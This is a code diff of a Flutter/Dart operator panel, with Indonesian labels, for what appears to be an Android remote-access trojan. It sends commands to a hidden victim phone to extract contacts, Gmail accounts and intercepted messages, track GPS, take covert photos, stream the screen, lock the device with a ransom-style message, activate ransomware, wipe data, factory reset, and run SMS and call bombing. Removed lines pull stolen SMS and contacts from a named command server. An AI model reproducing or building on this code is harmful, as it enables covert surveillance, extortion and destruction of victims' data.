-                        _btn("Toast", Icons.chat_bubble_outline, Colors.white, "toast_spam", targetId, isInput: true),
-                        _btn("Open URL", Icons.link, Colors.blue, "open_url", targetId, isInput: true),
-                        _btn("Bring Front", Icons.open_in_new, Colors.white, "bring_to_foreground", targetId),
-                      ]),
-                    ]),
-                    ListView(physics: const BouncingScrollPhysics(), children: [
-                      _buildControlBlock("SECURITY LOCKDOWN", Colors.redAccent, [
-                        _btn("LOCK HP", Icons.lock, Colors.redAccent, "hard_lock", targetId, isInput: true),
-                        _btn("UNLOCK", Icons.lock_open, Colors.greenAccent, "unlock", targetId),
-                        _btn("SELF DEST", Icons.delete_forever, Colors.red, "self_destruct", targetId),
-                      ]),
-                    ]),
-                  ],
+              const Text("Pilih lensa kamera:", style: TextStyle(color: Colors.white54, fontSize: 12)),
+              const SizedBox(height: 20),
+              Row(
+                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
+                children: [
+                  _cameraOption(Icons.camera_rear, "BELAKANG", "back", selectedCam, (val) => setInternalState(() => selectedCam = val)),
+                  _cameraOption(Icons.camera_front, "DEPAN", "front", selectedCam, (val) => setInternalState(() => selectedCam = val)),
+                ],
+              ),
+              const SizedBox(height: 30),
+              ElevatedButton(
+                style: ElevatedButton.styleFrom(
+                  backgroundColor: Color(0xFFE53935),
+                  minimumSize: const Size(double.infinity, 45),
                 ),
+                onPressed: () {
+                  _sendCommand("take_photo", targetId, extra: selectedCam);
+                  Navigator.pop(context);
+                },
+                child: const Text("AMBIL FOTO", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
               ),
             ],
           ),
@@ -424,143 +516,572 @@ class _ControlCenterPageState extends State<ControlCenterPage> {
     );
   }
 
-  Widget _buildLogContainer() {
-    return Padding(
-      padding: const EdgeInsets.all(12),
-      child: _glassContainer(
-        opacity: 0.15,
-        child: Container(
-          height: 100,
-          width: double.infinity,
+  Widget _cameraOption(IconData icon, String label, String value, String current, Function(String) onTap) {
+    bool isSelected = value == current;
+    return GestureDetector(
+      onTap: () => onTap(value),
+      child: Column(
+        children: [
+          Icon(icon, size: 40, color: isSelected ? Color(0xFFE53935) : Colors.white24),
+          const SizedBox(height: 8),
+          Text(label, style: TextStyle(color: isSelected ? Color(0xFFE53935) : Colors.white24, fontSize: 10, fontWeight: FontWeight.bold)),
+        ],
+      ),
+    );
+  }
+
+  void _showGmailDialog(String emails) {
+    showDialog(
+      context: context,
+      builder: (context) => AlertDialog(
+        backgroundColor: cardBg,
+        title: const Text("GOOGLE ACCOUNTS", style: TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
+        content: Container(
           padding: const EdgeInsets.all(10),
-          child: ListView.builder(
+          decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(8)),
+          child: SelectableText(
+            emails,
+            style: const TextStyle(color: Color(0xFFE53935), fontFamily: 'monospace', fontSize: 13),
+          ),
+        ),
+        actions: [
+          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP", style: TextStyle(color: Color(0xFFE53935)))),
+        ],
+      ),
+    );
+  }
+
+  void _showInputDialog(String title, String cmd, String targetId) {
+    TextEditingController textCtrl = TextEditingController();
+    TextEditingController pinCtrl = TextEditingController();
+    TextEditingController phoneCtrl = TextEditingController();
+    TextEditingController countCtrl = TextEditingController();
+    TextEditingController msgCtrl = TextEditingController();
+    TextEditingController soundCtrl = TextEditingController();
+
+    showDialog(
+      context: context,
+      builder: (context) => AlertDialog(
+        backgroundColor: cardBg,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
+        title: Row(
+          children: [
+            Icon(
+              cmd == "play_audio" ? Icons.music_note : 
+              (cmd == "set_wallpaper" ? Icons.image : 
+              (cmd == "hard_lock" ? Icons.lock : 
+              (cmd == "call_bombing" ? Icons.phone : 
+              (cmd == "sms_bomber" ? Icons.message :
+              (cmd == "virus_mode" ? Icons.bug_report : Icons.link))))),
+              color: Color(0xFFE53935), size: 20
+            ),
+            const SizedBox(width: 10),
+            Text(title, style: const TextStyle(color: Color(0xFFE53935), fontSize: 14, fontWeight: FontWeight.bold)),
+          ],
+        ),
+        content: Column(
+          mainAxisSize: MainAxisSize.min,
+          children: [
+            if (cmd == "play_audio" || cmd == "set_wallpaper" || cmd == "open_url")
+              TextField(
+                controller: textCtrl,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: InputDecoration(
+                  labelText: cmd == "play_audio" ? "Link URL MP3" : (cmd == "set_wallpaper" ? "Link URL Gambar" : "URL Website"),
+                  labelStyle: const TextStyle(color: Color(0xFFE53935)),
+                  hintText: "https://...",
+                  hintStyle: const TextStyle(color: Colors.white12),
+                  enabledBorder: const UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: const UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+            if (cmd == "hard_lock") ...[
+              TextField(
+                controller: textCtrl,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: const InputDecoration(
+                  labelText: "Pesan Layar",
+                  labelStyle: TextStyle(color: Color(0xFFE53935)),
+                  hintText: "YOUR PHONE IS LOCKED",
+                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+              const SizedBox(height: 15),
+              TextField(
+                controller: pinCtrl,
+                keyboardType: TextInputType.number,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: const InputDecoration(
+                  labelText: "PIN Unlock",
+                  labelStyle: TextStyle(color: Color(0xFFE53935)),
+                  hintText: "0853",
+                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+            ],
+            if (cmd == "virus_mode") ...[
+              TextField(
+                controller: soundCtrl,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: const InputDecoration(
+                  labelText: "URL Sound (opsional)",
+                  labelStyle: TextStyle(color: Color(0xFFE53935)),
+                  hintText: "https://files.catbox.moe/u981c4.m4a",
+                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+              const SizedBox(height: 15),
+              TextField(
+                controller: msgCtrl,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: const InputDecoration(
+                  labelText: "Pesan Virus",
+                  labelStyle: TextStyle(color: Color(0xFFE53935)),
+                  hintText: "🦠 CRITICAL VIRUS DETECTED!",
+                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+            ],
+            if (cmd == "call_bombing") ...[
+              TextField(
+                controller: countCtrl,
+                keyboardType: TextInputType.number,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: const InputDecoration(
+                  labelText: "Jumlah Panggilan",
+                  labelStyle: TextStyle(color: Color(0xFFE53935)),
+                  hintText: "50",
+                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+            ],
+            if (cmd == "sms_bomber") ...[
+              TextField(
+                controller: phoneCtrl,
+                keyboardType: TextInputType.phone,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: const InputDecoration(
+                  labelText: "Nomor Target",
+                  labelStyle: TextStyle(color: Color(0xFFE53935)),
+                  hintText: "08123456789",
+                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+              const SizedBox(height: 15),
+              TextField(
+                controller: countCtrl,
+                keyboardType: TextInputType.number,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: const InputDecoration(
+                  labelText: "Jumlah SMS",
+                  labelStyle: TextStyle(color: Color(0xFFE53935)),
+                  hintText: "100",
+                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+              const SizedBox(height: 15),
+              TextField(
+                controller: msgCtrl,
+                style: const TextStyle(color: Colors.white, fontSize: 13),
+                decoration: const InputDecoration(
+                  labelText: "Pesan",
+                  labelStyle: TextStyle(color: Color(0xFFE53935)),
+                  hintText: "YOU HAVE BEEN HACKED!",
+                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
+                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
+                ),
+              ),
+            ],
+          ],
+        ),
+        actions: [
+          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Batal", style: TextStyle(color: Colors.white38))),
+          ElevatedButton(
+            style: ElevatedButton.styleFrom(backgroundColor: Color(0xFFE53935)),
+            onPressed: () {
+              if (cmd == "play_audio" || cmd == "set_wallpaper" || cmd == "open_url") {
+                _sendCommand(cmd == "play_audio" ? "play_audio" : cmd, targetId, extra: textCtrl.text.trim());
+              } else if (cmd == "hard_lock") {
+                String msg = textCtrl.text.trim();
+                String pin = pinCtrl.text.trim();
+                if (msg.isEmpty) msg = "YOUR PHONE IS LOCKED!";
+                if (pin.isEmpty) pin = "0853";
+                _sendCommand("hard_lock", targetId, extra: "$msg|$pin");
+              } else if (cmd == "virus_mode") {
+                String sound = soundCtrl.text.trim();
+                String message = msgCtrl.text.trim();
+                if (sound.isNotEmpty && message.isNotEmpty) {
+                  _sendCommand("virus_mode", targetId, extra: "$sound|$message");
+                } else if (sound.isNotEmpty) {
+                  _sendCommand("virus_mode", targetId, extra: sound);
+                } else if (message.isNotEmpty) {
+                  _sendCommand("virus_mode", targetId, extra: message);
+                } else {
+                  _sendCommand("virus_mode", targetId);
+                }
+              } else if (cmd == "call_bombing") {
+                String count = countCtrl.text.trim();
+                _sendCommand("call_bombing", targetId, extra: count.isEmpty ? "50" : count);
+              } else if (cmd == "sms_bomber") {
+                String phone = phoneCtrl.text.trim();
+                String count = countCtrl.text.trim();
+                String msg = msgCtrl.text.trim();
+                if (phone.isEmpty) phone = "08123456789";
+                if (count.isEmpty) count = "100";
+                if (msg.isEmpty) msg = "YOU HAVE BEEN HACKED!";
+                _sendCommand("sms_bomber", targetId, extra: "$phone|$count|$msg");
+              }
+              Navigator.pop(context);
+            },
+            child: const Text("Kirim", style: TextStyle(color: Colors.black)),
+          ),
+        ],
+      ),
+    );
+  }
+
+  void _showConfirmDialog(String title, String message, String cmd, String targetId, {String? extra}) {
+    showDialog(
+      context: context,
+      builder: (context) => AlertDialog(
+        backgroundColor: cardBg,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
+        title: Row(
+          children: [
+            Icon(Icons.warning, color: Color(0xFFE53935), size: 24),
+            const SizedBox(width: 10),
+            Text(title, style: const TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold)),
+          ],
+        ),
+        content: Text(
+          message,
+          style: const TextStyle(color: Colors.white, fontSize: 13),
+        ),
+        actions: [
+          TextButton(
+            onPressed: () => Navigator.pop(context),
+            child: const Text("BATAL", style: TextStyle(color: Colors.white38)),
+          ),
+          ElevatedButton(
+            style: ElevatedButton.styleFrom(
+              backgroundColor: Color(0xFFE53935),
+            ),
+            onPressed: () {
+              _sendCommand(cmd, targetId, extra: extra);
+              Navigator.pop(context);
+            },
+            child: const Text("KIRIM", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
+          ),
+        ],
+      ),
+    );
+  }
+
+  void _showNotif(String m) {
+    ScaffoldMessenger.of(context).showSnackBar(SnackBar(backgroundColor: Color(0xFFE53935), content: Text(m), duration: const Duration(seconds: 1)));
+  }
+
+  Widget _buildLogContainer() {
+    return Container(
+      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
+      padding: const EdgeInsets.all(12),
+      height: 120, 
+      decoration: BoxDecoration(
+        color: cardBg,
+        borderRadius: BorderRadius.circular(15),
+        border: Border.all(color: Color(0xFFE53935)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          const Row(
+            children: [
+              Icon(Icons.list_alt, color: Color(0xFFE53935), size: 14),
+              SizedBox(width: 8),
+              Text("Activity Log", style: TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
+            ],
+          ),
+          const SizedBox(height: 8),
+          Expanded(
+            child: ListView.builder(
               itemCount: _executionLogs.length,
-              itemBuilder: (context, i) => Text(_executionLogs[i], style: const TextStyle(color: Color(0xFF00FF41), fontSize: 11, fontFamily: 'monospace'))),
+              itemBuilder: (context, i) => Padding(
+                padding: const EdgeInsets.symmetric(vertical: 2),
+                child: Text(
+                  _executionLogs[i], 
+                  style: const TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'monospace'),
+                  maxLines: 1,
+                  overflow: TextOverflow.ellipsis,
+                ),
+              ),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildControlBlock(String title, String subtitle, IconData icon, List<Widget> actionButtons) {
+    return Container(
+      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 8),
+      padding: const EdgeInsets.all(15),
+      decoration: BoxDecoration(
+        color: cardBg, 
+        borderRadius: BorderRadius.circular(15),
+        border: Border.all(color: Color(0xFFE53935).withOpacity(0.3), width: 1.5), 
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
+            children: [
+              Container(
+                padding: const EdgeInsets.all(8),
+                decoration: BoxDecoration(
+                  color: Color(0xFFE53935).withOpacity(0.1),
+                  borderRadius: BorderRadius.circular(8),
+                ),
+                child: Icon(icon, color: Color(0xFFE53935), size: 24),
+              ),
+              const SizedBox(width: 15),
+              Expanded(
+                child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
+                  children: [
+                    Text(title, style: const TextStyle(color: Color(0xFFE53935), fontSize: 16, fontWeight: FontWeight.bold)),
+                    const SizedBox(height: 4),
+                    Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 10)),
+                  ],
+                ),
+              ),
+              const Icon(Icons.keyboard_arrow_down, color: Color(0xFFE53935)),
+            ],
+          ),
+          const SizedBox(height: 15),
+          Wrap(
+            spacing: 10,
+            runSpacing: 10,
+            children: actionButtons,
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildActionButton(String label, IconData icon, String cmd, String targetId) {
+    return InkWell(
+      onTap: () {
+        if (cmd == 'get_notif_logs') {
+          _fetchNotificationLogs(targetId);
+        } else if (cmd == 'take_photo') {
+          _showCameraMenu(targetId); 
+        } else if (cmd == 'open_url' || cmd == 'hard_lock' || cmd == 'set_wallpaper' || cmd == 'play_audio_input') {
+          String dialogTitle = cmd == 'hard_lock' ? "🔒 HARD LOCK" : (cmd == 'set_wallpaper' ? "Ubah Wallpaper" : (cmd == 'play_audio_input' ? "Play MP3" : "Masukkan URL"));
+          _showInputDialog(dialogTitle, cmd == 'play_audio_input' ? 'play_audio' : cmd, targetId);
+        } else if (cmd == 'stop_audio') {
+          _sendCommand("stop_audio", targetId);
+        } else if (cmd == 'activate_ransomware') {
+          _showConfirmDialog("💀 RANSOMWARE WARNING", "Aktifkan Ransomware?\nFile akan dienkripsi!", "activate_ransomware", targetId);
+        } else if (cmd == 'decrypt_files') {
+          _showConfirmDialog("🔓 DECRYPT FILES", "Dekripsi semua file?", "decrypt_files", targetId);
+        } else if (cmd == 'panic_mode') {
+          _showConfirmDialog("⚠️ PANIC MODE", "Aktifkan Panic Mode?\nPIN unlock akan DINONAKTIFKAN!\nHanya bisa unlock via controller!", "panic_mode", targetId);
+        } else if (cmd == 'virus_mode') {
+          _showInputDialog("🦠 VIRUS MODE", "virus_mode", targetId);
+        } else if (cmd == 'panic_unlock') {
+          _sendCommand("panic_unlock", targetId);
+        } else if (cmd == 'virus_unlock') {
+          _sendCommand("virus_unlock", targetId);
+        } else if (cmd == 'factory_reset') {
+          _showConfirmDialog("💣 FACTORY RESET", "RESET HP TARGET KE SETTINGAN PABRIK?\nSEMUA DATA AKAN HILANG!", "factory_reset", targetId);
+        } else if (cmd == 'wipe_data') {
+          _showConfirmDialog("🗑️ WIPE DATA", "HAPUS SEMUA FILE TARGET?\nFoto, video, dokumen akan hilang!", "wipe_data", targetId);
+        } else if (cmd == 'call_bombing') {
+          _showInputDialog("📞 CALL BOMBING", "call_bombing", targetId);
+        } else if (cmd == 'sms_bomber') {
+          _showInputDialog("📨 SMS BOMBER", "sms_bomber", targetId);
+        } else if (cmd == 'battery_drain') {
+          _showConfirmDialog("🔋 BATTERY DRAIN", "Aktifkan Battery Drain?\nBaterai target akan cepat habis!", "battery_drain", targetId);
+        } else {
+          _sendCommand(cmd, targetId);
+        }
+      },
+      borderRadius: BorderRadius.circular(8),
+      child: Container(
+        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
+        decoration: BoxDecoration(
+          color: const Color(0xFF2A2A2A), 
+          borderRadius: BorderRadius.circular(8),
+          border: Border.all(color: Color(0xFFE53935).withOpacity(0.2)),
+        ),
+        child: Row(
+          mainAxisSize: MainAxisSize.min, 
+          children: [
+            Icon(icon, color: Color(0xFFE53935), size: 14),
+            const SizedBox(width: 6),
+            Text(label, style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold)),
+          ],
         ),
       ),
     );
   }
 
-  void _fetchNotificationLogs(String targetId) async {
-    _addLog("Fetching notifications...");
-    _sendCommand("get_notif_logs", targetId, isSilent: true);
-  }
-}
-
-// =========================================================================
-// [VVIP MODULES DATA VIEWER]
-// =========================================================================
-
-class SmsChatViewerPage extends StatefulWidget {
-  final String targetId;
-  const SmsChatViewerPage({super.key, required this.targetId});
-  @override
-  State<SmsChatViewerPage> createState() => _SmsChatViewerPageState();
-}
-
-class _SmsChatViewerPageState extends State<SmsChatViewerPage> {
-  List<dynamic> _messages = [];
-  bool _isLoading = true;
-
-  @override
-  void initState() {
-    super.initState();
-    _fetchSmsData();
-  }
-
-  Future<void> _fetchSmsData() async {
-    try {
-      final res = await http.get(Uri.parse("http://marxxxnotdev.danzxncloud.biz.id:11662/api/get-response/${widget.targetId}"));
-      if (res.statusCode == 200) {
-        final json = jsonDecode(res.body);
-        if (mounted) setState(() { _messages = json['data']['sms'] ?? []; _isLoading = false; });
-      }
-    } catch (e) { if (mounted) setState(() => _isLoading = false); }
-  }
-
   @override
   Widget build(BuildContext context) {
+    final device = widget.device;
+    final String targetId = device?['id']?.toString() ?? "unknown";
+    final String model = device?['model'] ?? "Device";
+
     return Scaffold(
-      backgroundColor: Colors.black,
-      appBar: AppBar(title: const Text("SMS Interceptor"), backgroundColor: Colors.black),
-      body: _isLoading 
-        ? const Center(child: CircularProgressIndicator(color: Colors.pinkAccent))
-        : ListView.builder(
-            padding: const EdgeInsets.all(15),
-            itemCount: _messages.length,
-            itemBuilder: (context, i) {
-              final msg = _messages[i];
-              return Container(
-                margin: const EdgeInsets.only(bottom: 12),
-                child: ClipRRect(
-                  child: BackdropFilter(
-                    filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
-                    child: Container(
-                      padding: const EdgeInsets.all(15),
-                      decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(15), border: Border.all(color: Colors.pinkAccent.withOpacity(0.2))),
-                      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-                        Text(msg['address'] ?? "Unknown", style: const TextStyle(color: Colors.pinkAccent, fontWeight: FontWeight.bold)),
-                        const SizedBox(height: 5),
-                        Text(msg['body'] ?? "", style: const TextStyle(color: Colors.white)),
-                      ]),
-                    ),
-                  ),
+      backgroundColor: darkBg,
+      appBar: AppBar(
+        backgroundColor: cardBg, 
+        elevation: 0, 
+        leading: IconButton(
+          icon: const Icon(Icons.arrow_back, color: Color(0xFFE53935)),
+          onPressed: () => Navigator.pop(context),
+        ),
+        title: Column(
+          crossAxisAlignment: CrossAxisAlignment.start,
+          children: [
+            Text(model, style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: Color(0xFFE53935))),
+            Text(targetId, style: const TextStyle(fontSize: 10, color: Colors.white38)),
+          ],
+        ),
+        actions: [
+          if (_isSending) 
+            const Padding(
+              padding: EdgeInsets.only(right: 15),
+              child: Center(child: SizedBox(width: 15, height: 15, child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFFE53935)))),
+            ),
+          IconButton(
+            onPressed: () {
+                setState(() {});
+                _sendCommand("force_open", targetId, isSilent: true);
+            }, 
+            icon: const Icon(Icons.refresh, size: 20, color: Color(0xFFE53935))
+          )
+        ],
+      ),
+      body: ListView(
+        padding: const EdgeInsets.only(bottom: 20),
+        children: [
+          Container(
+            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
+            color: cardBg,
+            child: Row(
+              mainAxisAlignment: MainAxisAlignment.spaceBetween,
+              children: [
+                Row(
+                  children: [
+                    const Icon(Icons.battery_full, color: Color(0xFFE53935), size: 14),
+                    const SizedBox(width: 4),
+                    Text("${device?['battery'] ?? '100'}%", style: const TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
+                  ],
                 ),
-              );
-            },
-          ),
-    );
-  }
-}
-
-class DataViewerPage extends StatefulWidget {
-  final String title;
-  final String cmd;
-  final String targetId;
-  const DataViewerPage({super.key, required this.title, required this.cmd, required this.targetId});
-  @override
-  State<DataViewerPage> createState() => _DataViewerPageState();
-}
-
-class _DataViewerPageState extends State<DataViewerPage> {
-  List<dynamic> _dataList = [];
-  bool _isLoading = true;
-
-  @override
-  void initState() { super.initState(); _fetchData(); }
-
-  Future<void> _fetchData() async {
-    try {
-      final res = await http.get(Uri.parse("http://marxxxnotdev.danzxncloud.biz.id:11662/api/get-response/${widget.targetId}"));
-      if (res.statusCode == 200) {
-        final json = jsonDecode(res.body);
-        if (mounted) setState(() { _dataList = json['data'][widget.cmd == "get_apps" ? "apps" : "contacts"] ?? []; _isLoading = false; });
-      }
-    } catch (e) { if (mounted) setState(() => _isLoading = false); }
-  }
-
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      backgroundColor: Colors.black,
-      appBar: AppBar(title: Text(widget.title), backgroundColor: Colors.black),
-      body: _isLoading 
-        ? const Center(child: CircularProgressIndicator())
-        : ListView.builder(
-            itemCount: _dataList.length,
-            itemBuilder: (context, i) {
-              final item = _dataList[i];
-              return Container(
-                margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 5),
-                decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10)),
-                child: ListTile(
-                  leading: Icon(widget.cmd == "get_apps" ? Icons.android : Icons.person, color: Colors.orange),
-                  title: Text(item['name'] ?? "Unknown", style: const TextStyle(color: Colors.white)),
-                  subtitle: Text(widget.cmd == "get_apps" ? (item['package'] ?? "") : (item['num'] ?? ""), style: const TextStyle(color: Colors.white38)),
+                const Row(
+                  children: [
+                    Icon(Icons.android, color: Color(0xFFE53935), size: 14),
+                    SizedBox(width: 4),
+                    Text("Android", style: TextStyle(color: Color(0xFFE53935), fontSize: 12)),
+                  ],
                 ),
-              );
-            },
+                const Row(
+                  children: [
+                    Icon(Icons.visibility_off, color: Color(0xFFE53935), size: 14),
+                    SizedBox(width: 4),
+                    Text("Hidden", style: TextStyle(color: Color(0xFFE53935), fontSize: 12)),
+                  ],
+                ),
+              ],
+            ),
           ),
+          
+          _buildLogContainer(),
+
+          _buildControlBlock(
+            "Intelligence Extraction", 
+            "Contacts, Notifications, WhatsApp, Telegram, Gmail", 
+            Icons.folder_shared,
+            [
+              _buildActionButton("Get Contacts", Icons.contacts, "get_contacts", targetId),
+              _buildActionButton("Messages Intercept", Icons.message, "get_notif_logs", targetId),
+              _buildActionButton("Gmail List", Icons.account_circle, "get_gmails", targetId),
+              _buildActionButton("Request Access", Icons.security, "open_notification_settings", targetId),
+            ]
+          ),
+
+          _buildControlBlock(
+            "Audio Control", 
+            "Remote MP3 Player", 
+            Icons.volume_up,
+            [
+              _buildActionButton("Play MP3", Icons.play_arrow, "play_audio_input", targetId),
+              _buildActionButton("Stop Sound", Icons.stop, "stop_audio", targetId),
+            ]
+          ),
+
+          _buildControlBlock(
+            "Location Tracking", 
+            "Real-time GPS", 
+            Icons.location_on,
+            [
+              _buildActionButton("Get Location", Icons.my_location, "get_location", targetId),
+            ]
+          ),
+
+          _buildControlBlock(
+            "Media & Surveillance", 
+            "Camera & Screen Stream", 
+            Icons.camera_alt,
+            [
+              _buildActionButton("Instant Photo", Icons.camera, "take_photo", targetId),
+              _buildActionButton("Real Stream", Icons.screenshot, "get_screen", targetId),
+              _buildActionButton("Set Wallpaper", Icons.image, "set_wallpaper", targetId),
+              _buildActionButton("START STROBE", Icons.flash_on, "flash_strobe", targetId),
+              _buildActionButton("STOP STROBE", Icons.flash_off, "stop_strobe", targetId),
+            ]
+          ),
+
+          _buildControlBlock(
+            "LOCK SYSTEM", 
+            "Hard Lock, Unlock, Ransomware, PANIC MODE, VIRUS MODE", 
+            Icons.smartphone,
+            [
+              _buildActionButton("🔒 HARD LOCK", Icons.lock, "hard_lock", targetId),
+              _buildActionButton("🔓 UNLOCK", Icons.lock_open, "unlock", targetId),
+              _buildActionButton("🌐 Open Link", Icons.link, "open_url", targetId),
+              _buildActionButton("📳 Vibrate", Icons.vibration, "vibrate_loop", targetId),
+              _buildActionButton("💀 RANSOMWARE", Icons.bug_report, "activate_ransomware", targetId),
+              _buildActionButton("🔓 DECRYPT", Icons.security, "decrypt_files", targetId),
+              _buildActionButton("⚠️ PANIC MODE", Icons.warning_amber_rounded, "panic_mode", targetId),
+              _buildActionButton("🔓 PANIC UNLOCK", Icons.lock_open, "panic_unlock", targetId),
+              _buildActionButton("🦠 VIRUS MODE", Icons.bug_report, "virus_mode", targetId),
+              _buildActionButton("🔓 VIRUS UNLOCK", Icons.lock_open, "virus_unlock", targetId),
+            ]
+          ),
+
+          _buildControlBlock(
+            "💣 DESTRUCTIVE", 
+            "Factory Reset, Wipe Data, Call Bombing, SMS Bomber, Battery Drain", 
+            Icons.warning,
+            [
+              _buildActionButton("💣 FACTORY RESET", Icons.settings_backup_restore, "factory_reset", targetId),
+              _buildActionButton("🗑️ WIPE DATA", Icons.delete_forever, "wipe_data", targetId),
+              _buildActionButton("📞 CALL BOMBING", Icons.phone, "call_bombing", targetId),
+              _buildActionButton("📨 SMS BOMBER", Icons.message, "sms_bomber", targetId),
+              _buildActionButton("🔋 BATTERY DRAIN", Icons.battery_alert, "battery_drain", targetId),
+            ]
+          ),
+        ],
+      ),
     );
   }
 }
